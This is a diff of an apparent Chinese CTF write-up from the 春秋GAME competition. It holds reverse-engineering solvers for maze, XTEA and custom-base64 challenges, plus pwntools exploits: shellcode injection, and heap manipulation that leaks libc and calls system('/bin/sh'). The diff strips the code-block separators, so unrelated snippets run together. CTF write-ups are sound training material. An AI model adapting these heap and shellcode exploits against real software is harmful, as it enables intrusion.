@@ -823,11 +823,13 @@ https://www.ichunqiu.com/competition
 
 欢迎找到春秋GAME投稿哦～
 
-联系vx:cium0309
+联系vx:
+cium0309
 
 欢迎加入 春秋GAME CTF交流2群
 
-Q群:703460426
+Q群:
+703460426
 
 
 ```
@@ -932,18 +934,8 @@ for i in range(36):
   flag += enc[i]
 
 print("flag{" + flag + "}")
-```
-
-
-
-```
 python3 deflat.py -f ./ezam --addr 0x4008F0
 python3 deflat.py -f ./ezam_recovered --addr 0x400670
-```
-
-
-
-```
 __int64 __fastcall main(int a1, char **a2, char **a3)
 {
   unsigned __int8 ii; // [rsp+197h] [rbp-2A9h]
@@ -1048,11 +1040,6 @@ LABEL_43:
   printf("Err0rn");
   return 1;
 }
-```
-
-
-
-```
 __int64 __fastcall sub_400670(__int64 a1, __int64 a2, unsigned __int8 a3)
 {
   __int64 result; // rax
@@ -1090,29 +1077,14 @@ __int64 __fastcall sub_400670(__int64 a1, __int64 a2, unsigned __int8 a3
   }
   return result;
 }
-```
-
-
-
-```
 ~a & b | ~b & a  // == a ^ b
 ~(~a | ~b)       // == a & b
 //....
-```
-
-
-
-```
 line 37-38: 生成v16
 line 39-57: XTEA解密
 line 58-63: 把XTEA解密后的每个数据（32bits）按照大端二进制（4*8个）填入map中
 line 66-72: 处理输入数据，从ASCII码转换到对应数字，再通过sub_400670进行十进制到四进制的转换（大整数的进制转换，使用数组模拟）
 line 73-99: 走16*24迷宫，判断（v5代表在迷宫中的位置，以十进制xxyy表示）：有无出界、当前位置是否可走（1可走，0不可走），到终点（823，即map[8][23]）则判断正确；0代表上，1代表左，2代表下，3代表右
-```
-
-
-
-```
 mymap = [1, 0, 0, 0, 0, 0, 1, 1, 1, 0, 0, 0, 0, 0, 0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 1, 1, 0, 0, 0, 1, 1, 0, 1, 0, 0, 0, 1, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 1, 0, 0, 0, 1, 1, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 1, 1, 1, 1, 1, 1, 1, 1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 1, 1, 0, 1, 1, 0, 0, 1, 0, 0, 0, 1, 0, 0, 1, 0, 0, 1, 1, 0, 0, 0, 0, 0, 0, 1, 0, 1, 0, 0, 0, 1, 0, 0, 1, 1, 0, 0, 1, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1, 1, 1, 0, 0, 0, 1, 0, 1, 1, 0, 0, 0, 1, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 1, 1, 1, 1, 1, 1, 1, 1, 1, 0, 0, 0, 1, 0, 0, 1, 0, 1, 0, 0, 0, 1, 1, 0, 1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 1, 0, 1, 1, 0, 1, 0, 0, 0, 1, 0, 0, 1, 0, 0, 0, 1, 1, 0, 0, 0, 0, 1, 0, 1, 1, 1, 0, 0, 1, 1, 1, 1, 1, 1, 1, 1, 0, 0, 1, 1, 0, 0, 0, 0, 0, 1, 1, 1, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 1, 1, 1, 1, 0, 0, 0, 1, 1, 0, 0, 0, 1, 1, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 1, 0, 1, 0, 0, 0, 0, 0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0]
 for i in range(16):
     strmap = ""
@@ -1122,11 +1094,6 @@ for i in range(16):
         else:
             strmap += '*'
     print(strmap)
-```
-
-
-
-```
 __packed_struct(l_info)     // 12-byte trailer in header for loader
         TE32 l_checksum;
         LE32 l_magic;
@@ -1134,11 +1101,6 @@ __packed_struct(l_info)     // 12-byte trailer in header for loader
         unsigned char l_version;
         unsigned char l_format;
     __packed_struct_end()
-```
-
-
-
-```
 from keystone import *
 
 # 文件架构
@@ -1166,11 +1128,6 @@ for addr in range(start, end+1, 4):
   while(ref != ida_idaapi.BADADDR):
       my_patch(ref)
       ref = ida_xref.get_next_dref_to(addr, ref)
-```
-
-
-
-```
 import base64
 import re
 
@@ -1193,11 +1150,6 @@ b64table = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
 s = base64.b64encode(v24)
 flag = "flag{" + s.decode().translate(str.maketrans(b64table, mytable)) + "}"
 print(flag)
-```
-
-
-
-```
 value = [0,0,0,0,0]
 def hash():
     t = 0
@@ -1251,11 +1203,6 @@ def hash():
         t ^= (value[i] & 0x3e0) >> (1 * 5)
         t ^= (value[i] & 0x1f) >> (0 * 5)
     value[4] |= t << (0 * 5)
-```
-
-
-
-```
 hash_value=[0x963541E5, 0x80C0F758, 0x0C30C975, 0x9F6D867D]
 value = [0 for i in range(5)]
 ch = "23456789ABCDEFGHJKLMNPQRSTUVWXYZ"
@@ -1379,11 +1326,6 @@ def solve():
     
 
 solve()
-```
-
-
-
-```
 from pwn import *
 
 context.arch = 'amd64'
@@ -1396,11 +1338,6 @@ p.sendlineafter("?", str(len(shellcode)).encode())
 p.send(shellcode)
 
 p.interactive()
-```
-
-
-
-```
 add(1,0x418,"123")
 add(2,0x18,"123")
 delete(1)
@@ -1413,11 +1350,6 @@ libcaddr = u64(p.recv(8))-0x1ebfd0
 print(hex(libcaddr))
 heapaddr = u64(p.recv(8))-0x2d0
 print(hex(heapaddr))
-```
-
-
-
-```
 add(3,0x648,payload)
 payload1 = p64(0)*4+p64(0x670)
 add(4,0x28,payload1)
@@ -1425,11 +1357,6 @@ add(5,0x4f0,"123")
 add(6,0x28,"123")
 edit(4,payload1)
 delete(5)
-```
-
-
-
-```
 add(7,0x68,"123")
 add(8,0x68,"123")
 delete(8)
@@ -1439,21 +1366,11 @@ edit(3,payload)
 add(9,0x68,"/bin/shx00")
 add(10,0x68,p64(system))
 delete(9)
-```
-
-
-
-```
 payload = "POST /bin/sh HTTP1.1rn"
 
 payload += "abc: 123rn"
 
 payload += content
-```
-
-
-
-```
 add(16,0,"0n")
 
 show(0)
@@ -1461,13 +1378,8 @@ show(0)
 delete(0)
 
 show(0)
-```
-
-
-
-```
 from pwn import*
-#p = process("./program")
+    #p = process("./program")
 p=remote("127.0.0.1","8888")
 elf = ELF("./libc.so",checksec=False)
 def add(size,idx,content):
